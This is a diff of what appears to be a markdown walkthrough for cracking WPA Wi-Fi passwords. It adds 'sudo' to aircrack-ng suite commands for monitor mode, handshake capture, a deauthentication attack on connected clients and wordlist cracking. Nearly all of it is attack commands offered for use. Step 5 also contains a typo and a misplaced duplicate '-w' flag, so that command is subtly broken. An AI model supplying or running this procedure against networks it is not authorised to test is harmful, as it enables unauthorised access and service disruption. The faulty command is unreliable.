@@ -20,39 +20,43 @@
 
     iwconfig
 
+OR 
+
+    sudo iw dev
+
 #### 2) 
 
-    airmon-ng check kill 
+    sudo airmon-ng check kill 
     
   (Kill processes that might interfere)
 
 #### 3) 
 
-    airmon-ng start WIRELESS_INTERFACE 
+    sudo airmon-ng start WIRELESS_INTERFACE 
   
   (example: wlan0)
 
 #### 4) 
 
-    airodump-ng WIRELESS_INRERFACEmon 
+    sudo airodump-ng WIRELESS_INRERFACEmon 
     
   (wlan0mon) (Monitor for traffic and search for an access point to target)
 
 #### 5) 
 
-    airodump-ng -c CHANNEL --bssid BSSID -w CAPTURE_FILE -w WIRELESS_INTERFACEmon 
+    sudo airodump-ng -c CHANNEL --bssid BSSID -w CAPTURE_FILE -w WIRELESS_INTERFACEmon 
     
 (wlan0mon) (Capture the 4-way handshake)
 
 #### 6) 
 
-    aireplay-ng -0 NUM -a MAC_ADDRESS_OF_ACCESS_POINT -c STATION_NUMBER WIRELESS_INTERFACEmon 
+    sudo aireplay-ng -0 NUM -a MAC_ADDRESS_OF_ACCESS_POINT -c STATION_NUMBER WIRELESS_INTERFACEmon 
   
   (wlan0mon) (Deauth Attack, NUM means how many times will this attack be performed)
 
 #### 7) 
 
-    aircrack-ng -w WORDLIST.TXT -b BSSID CAPTURE_FILE 
+    sudo aircrack-ng -w WORDLIST.TXT -b BSSID CAPTURE_FILE 
     
   (Crack WPA Handshake)
 
